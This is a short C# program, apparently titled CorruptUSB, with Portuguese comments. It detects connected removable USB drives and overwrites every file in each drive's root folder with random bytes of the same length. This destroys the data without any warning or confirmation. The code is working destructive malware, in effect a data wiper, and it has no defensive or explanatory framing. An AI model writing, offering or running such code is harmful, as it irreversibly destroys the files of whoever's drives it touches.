using System;
using System.IO;

namespace CorruptUSB {
    class Program {
        static void Main(string[] args) {
            // Verifica se a unidade USB está conectada 
            DriveInfo[] drives = DriveInfo.GetDrives();
            foreach(DriveInfo drive in drives) {
                if (drive.IsReady && drive.DriveType == DriveType.Removable) {
                    Console.WriteLine("Unidade USB detectada!");

                    // Lista todos os arquivos da unidade USB
                    string[] filePaths = Directory.GetFiles(drive.Name);

                    foreach(string filePath in filePaths) {
                        // Corrompe cada arquivo
                        byte[] corruptedBytes = new byte[new FileInfo(filePath).Length];
                        Random rnd = new Random();
                        rnd.NextBytes(corruptedBytes);
                        File.WriteAllBytes(filePath, corruptedBytes);
                    }
                }
            }
        }
    }
}
